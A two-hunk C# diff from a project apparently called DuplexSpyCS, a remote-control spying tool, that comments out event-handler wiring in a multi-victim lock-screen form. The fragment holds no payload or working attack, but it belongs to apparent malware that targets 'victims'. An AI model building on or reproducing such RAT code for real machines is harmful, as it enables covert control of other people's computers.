@@ -79,7 +79,7 @@ namespace DuplexSpyCS
 
         void setup()
         {
-            clsStore.listener.ReceivedDecoded += Received;
+            //clsStore.listener.ReceivedDecoded += Received;
 
             for (int i = 0; i < l_victim.Count; i++)
             {
@@ -164,7 +164,7 @@ namespace DuplexSpyCS
 
         private void frmMultiLockScreen_FormClosed(object sender, FormClosedEventArgs e)
         {
-            clsStore.listener.ReceivedDecoded -= Received;
+            //clsStore.listener.ReceivedDecoded -= Received;
         }
     }
 }
